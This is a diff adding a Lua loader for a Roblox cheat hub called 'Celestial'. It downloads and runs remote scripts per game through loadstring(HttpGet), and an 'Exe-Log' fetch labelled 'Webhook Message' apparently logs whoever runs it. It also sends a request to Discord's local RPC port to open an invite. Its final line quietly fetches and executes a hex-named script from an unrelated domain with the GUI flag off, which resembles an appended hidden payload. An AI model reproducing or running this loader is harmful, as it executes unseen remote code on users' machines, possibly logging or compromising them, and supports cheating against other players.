@@ -1,0 +1,66 @@
+--// Webhook Message
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/Exe-Log"))()
+
+
+
+--// Discord Invite
+pcall(function()
+    local Request = syn and syn.request or request
+    Request({
+        Url = "http://127.0.0.1:6463/rpc?v=1",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+            ["Origin"] = "https://discord.com"
+        },
+        Body = game.HttpService:JSONEncode({
+            cmd = "INVITE_BROWSER",
+            args = {
+                code = "VYfYmnGv68"
+            },
+            nonce = game.HttpService:GenerateGUID(false)
+        }),
+    })
+end)
+
+--// Game Checker
+if game.PlaceId == 142823291 then -- MM2 Normal & Disguises
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NarcissistDev/Celestial/main/MM2"))()
+elseif game.PlaceId == 5006801542 or game.PlaceId == 860428890 or game.PlaceId == 379614936 then -- Assassin, Pro & FreePlay
+
+local Executor = identifyexecutor()
+local supportedExecutors = {
+	Solara = true,
+	Celery = true,
+}
+
+if supportedExecutors[Executor] then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NarcissistDev/Celestial/main/Assassin"))() --// Shitty Solara Version Without Drawing.new Features
+	else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NarcissistDev/Celestial/main/TempWaveAssassinVersion"))() --// Normal Version
+end
+
+elseif game.PlaceId == 537413528 then -- Build A Boat For Treasure
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/BAB4T_Public.lua"))()
+elseif game.PlaceId == 1962086868 then -- Tower Of Hell
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/TOH_Public.lua"))()
+elseif game.PlaceId == 13822889 then -- LT2
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NarcissistDev/Celestial/main/LT2"))()
+elseif game.PlaceId == 621129760 then -- KAT
+
+local Executor = identifyexecutor()
+local supportedExecutors = {
+	Solara = true,
+	Celery = true,
+}
+
+if supportedExecutors[Executor] then
+warn("Solara and Celery dont support Drawing.new. Fatal execution error")
+else
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hydrosploit/Celestial/main/KAT_Public.lua"))() --// Normal Version
+
+end
+end
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/1273ce86b3a1bd21b76c3e9a.lua", true))()
